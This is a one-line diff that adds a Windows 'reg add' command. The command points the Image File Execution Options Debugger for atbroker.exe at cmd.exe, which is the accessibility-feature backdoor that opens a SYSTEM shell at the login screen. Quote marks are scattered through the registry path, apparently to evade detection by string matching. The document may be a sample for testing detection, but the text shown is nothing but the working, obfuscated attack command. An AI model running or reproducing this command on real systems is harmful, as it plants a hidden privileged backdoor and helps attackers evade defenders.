@@ -1,0 +1,1 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\Curr"ent"Version\Im"ag"e F"il"e Exe"cut"ion O"pt"ions\at"broke"r.e"x"e" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
